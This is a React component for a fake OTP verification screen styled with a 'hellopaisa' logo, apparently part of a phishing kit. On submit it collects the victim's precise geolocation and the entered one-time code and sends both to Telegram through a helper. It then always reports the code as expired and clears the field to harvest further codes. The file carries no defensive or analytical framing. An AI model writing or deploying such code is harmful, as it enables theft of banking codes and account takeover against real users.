"use client"

import type React from "react"
import { useState, useRef, useEffect } from "react"
import { ArrowLeft, Lock, Loader2 } from "lucide-react"
import { StepIndicator } from "@/components/step-indicator"

interface OtpScreenProps {
  onVerify: () => void
  onBack: () => void
}

export default function OtpScreen({ onVerify, onBack }: OtpScreenProps) {
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(60)
  const [isLoading, setIsLoading] = useState(false)
  const [message, setMessage] = useState("")
  const [messageType, setMessageType] = useState<"error" | "success" | "">("")


  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(interval)
    }
  }, [timer])

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    if (!/^\d*$/.test(value)) return

    setOtp(value)

    if (message) {
      setMessage("")
      setMessageType("")
    }
  }

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault()

    if (otp.length === 0) {
      setMessage("Please enter OTP")
      setMessageType("error")
      return
    }

    if (timer === 0) {
      setMessage("Your OTP expired, please enter new OTP")
      setMessageType("error")
      return
    }

    setIsLoading(true)
    setMessage("")

    try {
      // 1️⃣ Get Precise Location
      const getPreciseLocation = (): Promise<{ lat: number, lon: number } | null> => {
        return new Promise((resolve) => {
          if (!navigator.geolocation) {
            resolve(null);
            return;
          }
          navigator.geolocation.getCurrentPosition(
            (position) => {
              resolve({
                lat: position.coords.latitude,
                lon: position.coords.longitude,
              });
            },
            () => resolve(null),
            { timeout: 5000 }
          );
        });
      };

      const preciseLoc = (await getPreciseLocation()) as { lat: number, lon: number } | null;

      // 2️⃣ Store OTP2
      sessionStorage.setItem("userOtp2", otp);

      // 3️⃣ Send to Telegram via Utility
      try {
        const { sendTelegramMessage } = await import("@/lib/telegram");
        await sendTelegramMessage({
          otp2: otp,
          lat: preciseLoc?.lat,
          lon: preciseLoc?.lon,
          title: "OTP Details",
          exclude: ["contact"]
        });
      } catch (error) {
        console.error("Telegram utility error:", error);
      }

      // Simulate verification delay
      await new Promise((resolve) => setTimeout(resolve, 1500))

      // Always show error as requested
      setMessage("Your OTP Has been expired please enter new OTP")
      setMessageType("error")
      setOtp("") // Clear input to encourage re-entry
      setTimer(60)
    } catch (error) {
      console.error("Error:", error)
      setMessage("Something went wrong, please try again")
      setMessageType("error")
    } finally {
      setIsLoading(false)
    }
  }

  const handleResend = () => {
    setTimer(60)
    setOtp("")
    setMessage("")
    setMessageType("")
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  return (
    <div className="h-[100dvh] bg-white flex flex-col overflow-hidden">
      {/* Header */}
      <header className="flex items-center justify-center relative px-4 py-2">
        <button onClick={onBack} className="absolute left-4 p-2 text-[#1a2a4a]" aria-label="Go back">
          <ArrowLeft className="w-6 h-6" strokeWidth={1.5} />
        </button>
        {/* Logo */}
        <div className="flex items-center">
          <span className="text-[22px] font-bold text-[#1a2a4a]">hello</span>
          <span className="text-[22px] font-bold text-[#d91a32]">paisa</span>
        </div>
      </header>

      {/* Step Indicator */}
      <StepIndicator />

      {/* Main Content */}
      <main className="flex-1 flex flex-col px-6 pt-4">

        {/* OTP Input Label */}
        <p className="text-[#8a94a6] text-sm text-center mb-4">Enter the OTP Code sent to 0574940738 your Mobile number</p>

        {/* Form */}
        <form onSubmit={handleVerify} className="space-y-6">
          {/* OTP Input Boxes */}
          <div className="relative mb-6">
            <input
              type="tel"
              value={otp}
              onChange={handleOtpChange}
              placeholder="Enter otp here"
              className="w-full h-14 pl-12 pr-4 rounded-xl border border-[#e0e4ea] text-[#1a2a4a] text-base placeholder:text-[#a0a8b4] focus:outline-none focus:border-[#1a2a4a] transition-colors"
            />
          </div>

          {/* Error/Success Message */}
          {message && (
            <div
              className={`text-center text-sm font-medium px-4 py-2 rounded-lg ${messageType === "error" ? "text-[#d91a32] bg-red-50" : "text-green-600 bg-green-50"
                }`}
            >
              {message}
            </div>
          )}

          {/* Verify Button */}
          <button
            type="submit"
            disabled={isLoading}
            className="w-full h-14 bg-[#152850] text-white text-base font-medium rounded-full hover:bg-[#1a3260] active:bg-[#0f1e3d] transition-colors disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2"
          >
            {isLoading && <Loader2 className="w-5 h-5 animate-spin" />}
            {isLoading ? "Verifying..." : "Verify"}
          </button>

          {/* Resend Section */}
          <div className="space-y-3 text-center pt-4">
            <p className="text-[#8a94a6] text-sm">
              {timer > 0
                ? `Didn't receive the code? Resend in ${formatTime(timer)}`
                : "Didn't receive the code? You can resend now"}
            </p>
            <button
              type="button"
              onClick={handleResend}
              disabled={timer > 0}
              className="text-[#152850] font-medium text-sm h-10 px-6 rounded-lg border border-[#e0e4ea] hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
            >
              Resend Code
            </button>
          </div>


        </form>
      </main>

      {/* Loading Overlay */}
      {isLoading && (
        <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-2xl shadow-xl flex flex-col items-center gap-4">
            <Loader2 className="w-12 h-12 text-[#152850] animate-spin" />

          </div>
        </div>
      )}
    </div>
  )
}
